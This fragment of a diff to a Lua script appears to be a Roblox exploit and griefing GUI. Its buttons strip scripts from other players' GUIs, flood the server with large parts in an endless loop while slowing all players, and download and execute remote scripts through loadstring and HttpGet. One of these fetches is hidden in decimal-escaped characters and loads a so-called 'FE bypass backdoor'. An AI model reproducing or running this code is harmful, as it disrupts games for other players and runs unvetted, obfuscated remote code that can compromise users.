-                -- Exclude your GUI from infection
                 if objectGui ~= myGui then
                     RemoveScripts(object)
 
-                    -- Disable clicking
                     if object:IsA("TextButton") then
                         object.Active = false
                         object.AutoButtonColor = false
@@ -2585,52 +2225,51 @@ createButton("Infect other GUIs", function()
     ChangeAllTextAndColor()
 end)
 
-    createButton("Lag", function()
-        while true do
-            for i = 1, 500 do
-                local part = Instance.new("Part")
-                part.Size = Vector3.new(100, 100, 100)
-                part.Position = Vector3.new(math.random(-9999, 9999), math.random(50, 100), math.random(-9999, 9999))
-                part.Anchored = false
-                part.Parent = game.Workspace
-            end
-            
-            for _, v in pairs(game.Players:GetPlayers()) do
-                if v.Character and v.Character:FindFirstChild("Humanoid") then
-                    v.Character.Humanoid.WalkSpeed = 1
-                    v.Character.Humanoid.JumpPower = 1
-                end
-            end
-            
-            task.wait(0.1)
+createButton("Lag", function()
+    while true do
+        for i = 1, 500 do
+            local part = Instance.new("Part")
+            part.Size = Vector3.new(100, 100, 100)
+            part.Position = Vector3.new(math.random(-9999, 9999), math.random(50, 100), math.random(-9999, 9999))
+            part.Anchored = false
+            part.Parent = game.Workspace
         end
-    end)
+        
+        for _, v in pairs(game.Players:GetPlayers()) do
+            if v.Character and v.Character:FindFirstChild("Humanoid") then
+                v.Character.Humanoid.WalkSpeed = 1
+                v.Character.Humanoid.JumpPower = 1
+            end
+        end
+        
+        task.wait(0.1)
+    end
+end)
 
-    createButton("Sheldoni Client", function()  
-        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Sheldoni-gui-29377"))()  
-    end)
+createButton("Sheldoni Client", function()  
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Sheldoni-gui-29377"))()  
+end)
 
-    createButton("Fe Bypass Backdoor Exec made by Yaaz", function()  
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/moedlol/FeBypass/refs/heads/main/Executor"))()
-    end)
+createButton("Fe Bypass Backdoor Exec made by Yaaz", function()  
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/moedlol/FeBypass/refs/heads/main/Executor"))()
+end)
 
-    createButton("c00lkidd gui", function()  
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/MiRw3b/c00lgui-v3rx/main/c00lguiv3rx.lua"))()
-    end)
+createButton("c00lkidd gui", function()  
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MiRw3b/c00lgui-v3rx/main/c00lguiv3rx.lua"))()
+end)
 
-    createButton("Quitos", function()  
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/moedlol/QUitos/refs/heads/main/sigma%20quitos"))()  
-    end)
+createButton("Quitos", function()  
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/moedlol/QUitos/refs/heads/main/sigma%20quitos"))()  
+end)
 
-    createButton("Demon (too overpowered)", function()  
-        loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")()   
-    end)
+createButton("Demon (too overpowered)", function()  
+    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")()   
+end)
 
-    createButton("Custom hint/Message", function()  
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/moedlol/Pilot-I-repeat/refs/heads/main/skibidi"))()
-    end)
+createButton("Custom hint/Message", function()  
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/moedlol/Pilot-I-repeat/refs/heads/main/skibidi"))()
+end)
 
--- Toggle Button to Close/Open GUI
 local toggleButton = Instance.new("TextButton")
 toggleButton.Size = UDim2.new(0, 100, 0, 50)
 toggleButton.Position = UDim2.new(1, -110, 0, 60)
